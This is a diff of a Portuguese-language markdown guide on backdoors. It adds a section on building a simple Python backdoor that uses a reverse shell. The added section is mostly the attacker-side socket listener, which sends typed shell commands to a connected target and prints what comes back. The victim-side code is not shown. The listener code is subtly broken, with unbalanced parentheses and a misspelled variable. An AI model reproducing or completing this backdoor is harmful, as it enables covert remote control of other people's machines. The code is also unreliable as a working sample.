@@ -9,7 +9,38 @@ tags: [Backdoor, APT-Técnicas]
 
 # um Guia sobre Backdoors
 
-> [!Note]
+> [!NOTE]
 > Conteúdo desse Guia
 * Como funciona um Backdoor
-* Como fazer um simples Backdoor
+* Como fazer um simples Backdoor usando python
+
+# um Backdoor simples em python
+Nesse exemplo demonstro um Backdoor que usa uma reverse shell e estabelece uma conexão com o alvo para a maquina
+do atacante do ataque, permitindo o atacante enviar comandos e receber outputs(saídas) do alvo.
+
+* O código usa a biblioteca socket pra fazer a comunicação entre os Hosts
+
+# Servidor
+
+```
+import socket
+
+#comunicação do servidor
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind('localhost', 8080)) #o ip padrão e localhost, e porta 8080
+s.listen(1)
+
+while True:
+    conn, addr = s.accept()
+    print(f"[+]Conectado a {addr}")
+  
+    while True:
+        command = input("Shell > ")
+        if command == 'exit':
+          conn.send(b'exit')
+          conn.close()
+          break
+        else:
+            conn.send(command.encode())
+            output = conn.recv(1024))
+            print(outut.decode())
